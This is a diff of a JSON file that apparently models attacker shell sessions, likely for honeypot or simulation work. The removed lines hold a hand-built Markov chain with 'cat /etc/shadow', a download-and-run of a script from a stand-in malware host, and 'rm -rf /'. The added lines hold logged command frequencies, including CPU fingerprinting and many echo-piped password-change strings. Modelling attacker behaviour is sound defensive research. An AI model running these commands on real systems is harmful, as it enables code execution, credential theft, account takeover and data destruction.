@@ -1,114 +1,223 @@
 {
-  "start": "bash",
-  "states": {
-    "bash": {
-      "type": "macro",
-      "transitions": {
-        "ls": 0.4,
-        "cat": 0.3,
-        "wget": 0.3
-      }
+    "0": {
+        "sshd": {
+            "none": {
+                "count": 2929,
+                "prob": 1.0
+            }
+        }
     },
-    "ls": {
-      "type": "micro",
-      "transitions": {
-        "ls -la": 0.6,
-        "ls /tmp": 0.4
-      }
+    "1": {
+        "cat": {
+            "/proc/cpuinfo": {
+                "count": 2929,
+                "prob": 1.0
+            }
+        }
     },
-    "ls -la": {
-      "type": "macro",
-      "transitions": {
-        "cat": 0.5,
-        "exit": 0.5
-      }
+    "2": {
+        "grep": {
+            "name": {
+                "count": 2929,
+                "prob": 1.0
+            }
+        }
     },
-    "ls /tmp": {
-      "type": "macro",
-      "transitions": {
-        "cat": 0.7,
-        "rm": 0.3
-      }
+    "3": {
+        "wc": {
+            "-l": {
+                "count": 2929,
+                "prob": 1.0
+            }
+        }
     },
-    "cat": {
-      "type": "micro",
-      "transitions": {
-        "cat /etc/passwd": 0.5,
-        "cat /etc/shadow": 0.5
-      }
-    },
-    "cat /etc/passwd": {
-      "type": "macro",
-      "transitions": {
-        "grep": 0.7,
-        "exit": 0.3
-      }
-    },
-    "cat /etc/shadow": {
-      "type": "macro",
-      "transitions": {
-        "wget": 0.6,
-        "exit": 0.4
-      }
-    },
-    "wget": {
-      "type": "micro",
-      "transitions": {
-        "wget http://malware.com/a.sh": 1.0
-      }
-    },
-    "wget http://malware.com/a.sh": {
-      "type": "macro",
-      "transitions": {
-        "chmod": 1.0
-      }
-    },
-    "chmod": {
-      "type": "micro",
-      "transitions": {
-        "chmod +x a.sh": 1.0
-      }
-    },
-    "chmod +x a.sh": {
-      "type": "macro",
-      "transitions": {
-        "./a.sh": 1.0
-      }
-    },
-    "./a.sh": {
-      "type": "macro",
-      "transitions": {
-        "exit": 1.0
-      }
-    },
-    "rm": {
-      "type": "micro",
-      "transitions": {
-        "rm -rf /": 1.0
-      }
-    },
-    "rm -rf /": {
-      "type": "macro",
-      "transitions": {
-        "exit": 1.0
-      }
-    },
-    "grep": {
-      "type": "micro",
-      "transitions": {
-        "grep root /etc/passwd": 1.0
-      }
-    },
-    "grep root /etc/passwd": {
-      "type": "macro",
-      "transitions": {
-        "exit": 1.0
-      }
-    },
-    "exit": {
-      "type": "terminal",
-      "transitions": {}
+    "4": {
+        "echo": {
+            "-e \"angela\\nbCfkzQILnZyp\\nbCfkzQILnZyp\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"concretyourdev\\njb417tX3w3Ph\\njb417tX3w3Ph\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"123456\\nUbp4LLoaSQAn\\nUbp4LLoaSQAn\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"naseema\\nbtpTFA8lcHG9\\nbtpTFA8lcHG9\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"mysql123\\nMfel55JlJ8CX\\nMfel55JlJ8CX\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"colihue\\nfiHfDN2dFfRN\\nfiHfDN2dFfRN\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"lorena\\nY877A47iKBun\\nY877A47iKBun\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"hms\\n4ad0rXmKfZe7\\n4ad0rXmKfZe7\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"live\\nHmi4x5pd7nGw\\nHmi4x5pd7nGw\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"12345678\\neIofXOAPrjVn\\neIofXOAPrjVn\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"mysql@123\\nquVPVlgEiwQ0\\nquVPVlgEiwQ0\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"delta\\nBFjeYjnrnK5z\\nBFjeYjnrnK5z\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"npin\\ntnWEewxNSjpk\\ntnWEewxNSjpk\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"password\\nxIFM1Fxn7RBw\\nxIFM1Fxn7RBw\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"swapnil\\nEI0hCWRTSV0x\\nEI0hCWRTSV0x\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"andre123\\nHI0KdsoA2m01\\nHI0KdsoA2m01\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"manager\\ncOUxjxXjRb5A\\ncOUxjxXjRb5A\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"Mioes\\nryl2pkTZGcUN\\nryl2pkTZGcUN\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"12345\\nUSF92SZPRbnw\\nUSF92SZPRbnw\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"danielbarria\\nTT6GZ4UxL1kH\\nTT6GZ4UxL1kH\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"qwedcxz\\nvEfmnjdqQFNw\\nvEfmnjdqQFNw\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"muhammadshidiq\\nFdDcLhFlnf1j\\nFdDcLhFlnf1j\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"test\\nEGwV8HZ8bMN8\\nEGwV8HZ8bMN8\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"wirat\\nmAwPS9ov8gpv\\nmAwPS9ov8gpv\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"123456\\nU7HcP7ys9rmy\\nU7HcP7ys9rmy\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"P@$$w0rd\\n6pDXm1TwyNOR\\n6pDXm1TwyNOR\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"dadan\\nYYhsVNJdf4uX\\nYYhsVNJdf4uX\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"nuc\\nQh3dLOE0LuZP\\nQh3dLOE0LuZP\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"P@55w0rd\\nDFlZojPZecU8\\nDFlZojPZecU8\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"jinsong\\nrOM7GpPk4e2S\\nrOM7GpPk4e2S\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"12345678\\n9ojgmhUfAmrm\\n9ojgmhUfAmrm\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"Ab123\\npvzZDl2H1Cnm\\npvzZDl2H1Cnm\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"spotlight\\nX4wg3y4rBtZ7\\nX4wg3y4rBtZ7\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"logitech\\npcwqsccEWHnd\\npcwqsccEWHnd\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"sergio123\\nn4RpfpeQxDMF\\nn4RpfpeQxDMF\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"password\\nJWzKn1rYZSee\\nJWzKn1rYZSee\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"mobiquity\\nkiSCBVrpaRmn\\nkiSCBVrpaRmn\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"tari\\n18LmsqerHKZM\\n18LmsqerHKZM\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"ADMIN\\nKBc69qcKY86l\\nKBc69qcKY86l\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"jbquilla\\nBAwyu2XY6yTZ\\nBAwyu2XY6yTZ\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"manuel\\nxHUhNFEVS9ly\\nxHUhNFEVS9ly\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"123456\\nuJCbFeV13h3l\\nuJCbFeV13h3l\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"sgp123\\nNMzNq19VqrI2\\nNMzNq19VqrI2\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"vibha\\nZCqFcyJuFTS6\\nZCqFcyJuFTS6\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"eungmin\\nzom96uv8Ml6Q\\nzom96uv8Ml6Q\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            },
+            "-e \"123123\\nN80Y6WNoq7nG\\nN80Y6WNoq7nG\"": {
+                "count": 1,
+                "prob": 0.021739130434782608
+            }
+        }
     }
-  }
 }
 
